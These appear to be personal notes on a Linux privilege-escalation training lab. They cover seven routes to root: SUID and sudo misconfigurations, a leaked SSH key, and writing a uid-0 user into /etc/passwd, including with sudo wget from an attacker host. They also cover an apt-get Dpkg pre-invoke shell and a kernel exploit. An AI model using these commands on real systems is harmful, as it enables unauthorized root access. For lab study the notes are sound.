Given
Seven ways to gain root
Common LPE tactics
This lab is meant to teach Linux LPE
username:password == muhammad:nasef 

Initial Stuff
Get in, id and whoami
Whoami = muhammed
Id, I am part of a ton of groups
sudo -l
Root nopasswd:
Apt-get
Wget
vuln/2/sudo?

LPE 1:
Opened vuln folder
Selected vuln 1
Given:
Suid.c
Suid
Stat *
Suid program is owned by root and has the suid bit set
Just execute and it will run and return as root
Cat suid.c
Spawns a shell
Just run the program, root shell
Super easy

LPE 2:
Vuln 2:
As revealed by sudo -l I can run program “sudo” as root without password
“sudo” just spawns a shell
Owned by root
Sudo -u root ./sudo

LPE 3:
Vuln 3:
“key” contains an RSA Private Key
SSH uses RSA
Possibly the root ssh private key?
ssh -i key root@localhost
Got root
LPE 4:
Vuln 4:
/etc/passwd is world writable
Very unusual I would think?
Simply add another user with a uid and guid of root [0] and leave the password field blank
itworks::0:0:itworks:/home/muhammad:/bin/bash
su itworks

LPE 5:
Vuln 5:
All out of vulns in the folder :(
wget can be run as root without passwd
Host file “passwd” on kali and share with python -m SimpleHTTPServer
“passwd” file has the same contents as LPE 4
sudo /bin/wget http://192.168.149.129:8000/passwd -O /etc/passwd
Was not able to test, but it would work :)
su itworks

LPE 6:
Vuln 6:
apt-get can be run as root without password
Look on gtfo bins
TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt-get install -c $TF sl
Whoami
Root

LPE 7:
Vuln 7:
Kernel exploit :)
Hosted exploit on kali and pulled with wget from simple HTTP server
Compiled exploit on LPE lab
Error compiling, but kernel is vulnerable. [2.6.24]
